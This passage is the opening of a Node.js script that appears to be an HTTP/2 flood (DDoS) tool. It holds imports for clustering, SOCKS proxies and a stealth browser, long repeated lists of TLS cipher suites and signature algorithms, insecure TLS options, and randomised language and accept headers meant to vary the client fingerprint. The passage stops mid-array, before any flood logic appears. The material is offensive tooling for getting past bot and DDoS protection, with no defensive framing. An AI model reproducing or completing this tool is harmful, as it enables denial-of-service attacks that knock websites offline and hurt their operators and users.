const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
var path = require("path");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const https = require('https');
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const colors = require('colors');
const { connect } = require("puppeteer-real-browser");
const HPACK = require('hpack');
const os = require('os');
const axios = require('axios');
const ipaddr = require('ipaddr.js'); // Assumption: ipaddr.js is installed or logic handles IP parsing

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// --- GLOBAL CONSTANTS & DATA STRUCTURES ---

const cplist = [
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA:!ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK:!SRP:!CAMELLIA",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

const hihi = [ "require-corp", "unsafe-none", ];
const sigalgs = [
 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
 'ecdsa_brainpoolP256r1tls13_sha256',
 'ecdsa_brainpoolP384r1tls13_sha384',
 'ecdsa_brainpoolP512r1tls13_sha512',
 'ecdsa_sha1',
 'ed25519',
 'ed448',
 'ecdsa_sha224',
 'rsa_pkcs1_sha1',
 'rsa_pss_pss_sha256',
 'dsa_sha256',
 'dsa_sha384',
 'dsa_sha512',
 'dsa_sha224',
 'dsa_sha1',
 'rsa_pss_pss_sha384',
 'rsa_pkcs1_sha2240',
 'rsa_pss_pss_sha512',
 'sm2sig_sm3',
 'ecdsa_secp521r1_sha512',
];
let concu = sigalgs.join(':');

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";
const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: concu,  // <-- This is likely the problem
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };

const lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    
]

accept_header = [
  'application/json',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
